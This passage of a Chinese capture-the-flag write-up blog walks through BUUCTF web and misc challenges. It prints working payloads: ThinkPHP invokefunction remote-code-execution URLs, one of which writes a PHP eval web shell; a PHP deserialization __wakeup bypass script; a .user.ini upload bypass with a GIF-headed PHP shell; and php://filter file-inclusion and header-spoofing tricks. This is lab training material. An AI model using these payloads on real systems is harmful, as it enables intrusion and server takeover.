class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22*flag*%22%</span><br></pre></td></tr></table></figure><p>呃呃呃，查出来的还真不少<br><img src="https://img-blog.csdnimg.cn/20200713143145432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>最后一个<br>然后直接cat对应的flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这个方法是写入一句话，直接写一个一句话木马在里面，然后使用蚁剑或者菜刀连接就行了，这方法挺不错的。试一下！<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=shell.php&amp;vars[1][1]=&lt;?php%20eval(<span class="variable">$_REQUEST</span>[<span class="string">&quot;m0re&quot;</span>]);?&gt;</span><br></pre></td></tr></table></figure><p>返回<br><img src="https://img-blog.csdnimg.cn/20200713144827396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>连接<br><img src="https://img-blog.csdnimg.cn/20200713144907572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到连接成功了，在根目录下可以找到flag</p><p>payload也有好几种，有兴趣的可以自行百度查看。</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>BUUCTFweb<br><img src="https://img-blog.csdnimg.cn/20200713152345195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到了备份网站，先用dirsearch扫一下<br>扫完了，看到<code>www.zip</code><br><img src="https://img-blog.csdnimg.cn/20200713153306123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>打开看到<code>flag.php</code>emmm？？？？<br><img src="https://img-blog.csdnimg.cn/20200713153448334.png" alt="m0re" loading="lazy"><br>果然提交了不对。还是要看另外两个文件<br>查看<code>index.php</code><br><img src="https://img-blog.csdnimg.cn/20200713153618479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后发现是利用PHP反序列化，<br><img src="https://img-blog.csdnimg.cn/20200713160638967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>当<code>username=admin</code>且<code>password=100</code>的时候输出flag，但是</p><p><img src="https://img-blog.csdnimg.cn/20200713160932176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个函数会把username变为guest，所以就需要序列化字符串中的对象来绕过。<br>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);<span class="comment">//这个是没有使用URL编码的</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));<span class="comment">//将其结果使用URL进行编码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;Name&quot;</span>:2:&#123;s:14:<span class="string">&quot;Nameusername&quot;</span>;s:5:<span class="string">&quot;admin&quot;</span>;s:14:<span class="string">&quot;Namepassword&quot;</span>;s:3:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>这个Name后面的数字是属性，代表两个变量，把2改成3，就能绕过__wakeup()函数。</p><blockquote><p>因为是private声明，我们需要在类名和字段名前面都会加上\0的前缀<br>这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><p>这段话是看一个师傅的wp中提到的，python提交方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">url =<span class="string">&quot;http://e1a18420-fb66-465e-b486-f4a86ce4eb95.node3.buuoj.cn&quot;</span></span><br><span class="line">html = requests.get(url+<span class="string">&#x27;?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;&#x27;</span>)</span><br><span class="line">print(html.text)</span><br></pre></td></tr></table></figure><p>可以得到flag<br><img src="https://img-blog.csdnimg.cn/20200713163600780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不用python的话，在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;Name&quot;</span>:3:&#123;s:14:<span class="string">&quot;%00Name%00username&quot;</span>;s:5:<span class="string">&quot;admin&quot;</span>;s:14:<span class="string">&quot;%00Name%00password&quot;</span>;i:100;&#125;</span><br></pre></td></tr></table></figure><p>这个也可以得到flag。<br>参考链接——<a href="https://www.cnblogs.com/wangtanzhi/p/12193930.html">https://www.cnblogs.com/wangtanzhi/p/12193930.html</a><br>还有一种方法是将序列化后的字符串先进行URL编码再提交，就不用python提交参数了。<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e1a18420-fb66-465e-b486-f4a86ce4eb95.node3.buuoj.cn/index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200713162825301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>参考链接——<a href="https://www.cnblogs.com/kevinbruce656/p/12332736.html">https://www.cnblogs.com/kevinbruce656/p/12332736.html</a></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="https://img-blog.csdnimg.cn/2020071316491257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>白给的shell。连接一句话，猜测可能是<code>shell.php</code><br>不过没有连接成功，现在的问题是shell的名字是什么？<br>看整个题的信息，能让人想到文件名的字符串也就是上面说的白给的shell还有题目的Knife了，<br><img src="https://img-blog.csdnimg.cn/20200713165338914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就在根目录下找到了flag</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>我先进行上传了一个<code>shell.php</code><br><img src="https://img-blog.csdnimg.cn/20200713171037442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>题目描述是有一个github地址的，那里有源码，<br>在index.php中找到了过滤条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">&quot;uploads/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, $extension)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到了这个是因为BUUCTF有源码地址，所以在源码中找到的，看了好多师傅的wp，原来的题中应该是没有源码的，所以需要自己去筛选过滤条件。<br>先贴一下参考链接——🍗<a href="https://xz.aliyun.com/t/6091">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a><br>按照这个师傅的wp来复现一下。<br>上传后缀为PHP的木马文件未成功，后缀黑名单过滤，尝试aaa<br><img src="https://img-blog.csdnimg.cn/20200716103846568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>证明还检测文件内容了，文件中不能包含<code>&lt;?</code><br>然后换文件内容再次进行尝试<br><img src="https://img-blog.csdnimg.cn/20200716104136691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到，这个就是使用了函数<code>exif_imagetype</code>，对文件类型进行过滤，也就是上面的源码中显示的这一部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后再加一个GIF的文件头，<code>GIF89a</code><br><img src="https://img-blog.csdnimg.cn/20200716104717801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，上传成功。还有一个<code>index.php</code>但是访问没有信息。<br>这些都是前置的一般上传步骤，然后网上的师傅们做这个题都是用的<code>.user.ini</code>上传后门。至于了解，参考链接那个师傅写过了，可以直接过去学习。</p><p>这里我就直接复现了<br>上传<code>.user.ini</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p>上传成功后，<br><img src="https://img-blog.csdnimg.cn/20200716105606723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>再上传一个图片马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;system(<span class="string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功上传后，访问</p><p><img src="https://img-blog.csdnimg.cn/20200716105821412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>访问即可得到flag：<a href="http://72d554a3-81e7-41c1-b987-c0c9432cbe16.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php">http://72d554a3-81e7-41c1-b987-c0c9432cbe16.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</a></p><p><code>.user.ini</code>利用条件</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开寻找信息，查看源码。发现<code>Secret.php</code><br><img src="https://img-blog.csdnimg.cn/20200716110812671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>访问，发现需要从一个指定的网站访问<br><img src="https://img-blog.csdnimg.cn/20200716110927460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>抓包修改或添加Referer头<br><img src="https://img-blog.csdnimg.cn/20200716111319263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>又要用<code>Syclover</code>浏览器，修改<code>User-Agent</code><br><img src="https://img-blog.csdnimg.cn/20200716111511763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>只能本地访问<br>使用XFF进行伪造<code>127.0.0.1</code><br><img src="https://img-blog.csdnimg.cn/20200716111720235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到flag，还可以用插件<code>ModHeader</code>解题，不用抓包。<br><img src="https://img-blog.csdnimg.cn/20200716112203847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>不过都一样。</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>这道题，名字是include，应该是文件包含有关的。再看到点击tip会跳转到一个界面，但是没有flag<br>url是这样的<code>http://371426d5-5373-47c1-9bf0-a7f7ef140596.node3.buuoj.cn/?file=flag.php</code><br>看到file想到了PHP伪协议<br>所以就尝试解题。首先尝试了<code>php://input</code><br><img src="https://img-blog.csdnimg.cn/20200716113508232.png" alt="m0re" loading="lazy"><br>但是被过滤了。<br>其他的挨个试，发现<code>php://filter</code>可以，<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://371426d5-5373-47c1-9bf0-a7f7ef140596.node3.buuoj.cn/?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200716113820679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>进行解码得到flag</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>英语不好多少有点上头，不过问题不是很大<code>exec=执行</code><br>环境也是，应该就是命令执行了。<br><img src="https://img-blog.csdnimg.cn/2020071611423365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>感觉命令执行就是看谁linux系统玩的转了。<br><img src="https://img-blog.csdnimg.cn/20200716115036999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>备份文件，老规矩直接扫<br><img src="https://img-blog.csdnimg.cn/20200716122214309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个长度不同，所以是它<br>然后访问得到备份文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是简单的PHP代码审计弱类型。<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3faea66d-27b6-4f7d-be12-d38ef1dc5b34.node3.buuoj.cn/?key=123</span><br></pre></td></tr></table></figure><p>得到flag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>解压得到68个压缩包，了解到考察点是CRC碰撞<br>一般需要CRC碰撞的题的特征：</p><ul><li>一般有很多zip的压缩包，</li><li>解压需要密码，且密码复杂，不可爆破</li><li>每个包很小，仅几k</li></ul><p>使用python脚本碰撞<br>CRC碰撞脚本(来源百度)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic: </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + k + h</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">            file = <span class="string">&#x27;out&#x27;</span>+str(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">            crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">            CrackCrc(crc)</span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = open(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">print(<span class="string">&quot;CRC32碰撞完成&quot;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>时间略久，等待。<br>然后得到一串base64编码，进行解码<br><img src="https://img-blog.csdnimg.cn/20200716143642518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>CF 90 73</code>查百度了解，知道是缺少rar头部的部分。<br><img src="https://img-blog.csdnimg.cn/20200716144455952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是没有得到flag——<code>fix the file and get the flag</code><br>然后看wp了解</p><blockquote><p>在文件头crc和位标记之间有一个74，这一位是固定的，但我们现在是7A</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200716144716839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>改过之后在解压会失败，但是不妨碍查看<br><img src="https://img-blog.csdnimg.cn/20200716144857417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="ACTF新生赛2020-明文攻击"><a href="#ACTF新生赛2020-明文攻击" class="headerlink" title="[ACTF新生赛2020]明文攻击"></a>[ACTF新生赛2020]明文攻击</h2><p>好久没做明文攻击的题了，我印象中好像也就做过一道，都快忘了。<br>现在以这个题复习一下。<br>既然要解压缩包，明文攻击肯定要有一个没密码的压缩包。只有图片里了，这个图片，foremost和binwalk都没有提取出来压缩包。<br><img src="https://img-blog.csdnimg.cn/20200710151053166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是，能知道是有个zip压缩包的尾部，所以到010editor查看<br>发现最后部位的压缩包缺少个pk头部<code>504B</code><br><img src="https://img-blog.csdnimg.cn/20200710150841853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>补全头部，得到一个压缩包<br><img src="https://img-blog.csdnimg.cn/20200710151451472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以开始明文攻击了，但是好慢啊<br><img src="https://img-blog.csdnimg.cn/2020071015212829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不解了，费劲。看wp去，<br><img src="https://img-blog.csdnimg.cn/20200716145921840.png" alt="m0re" loading="lazy"><br>这。。。。。。。。。。？？？？？？？？？？？？？？？？？？？？？<br>我修复了好多遍也没有得到答案。修复之后就没有文件了。（也可能是我的工具的问题）不管了<br>总之有点懵……<br><code>flag&#123;3te9_nbb_ahh8&#125;</code></p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>拼二维码<br>没什么意思，纯粹是拼，拼完扫二维码。</p><h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><p>一直解压，到<code>233.rar</code>winrar爆出了错误是文件头损坏<br><img src="https://img-blog.csdnimg.cn/20200716154642847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>修补一下，将<code>7A</code>改成<code>74</code><br><img src="https://img-blog.csdnimg.cn/2020071615482897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" 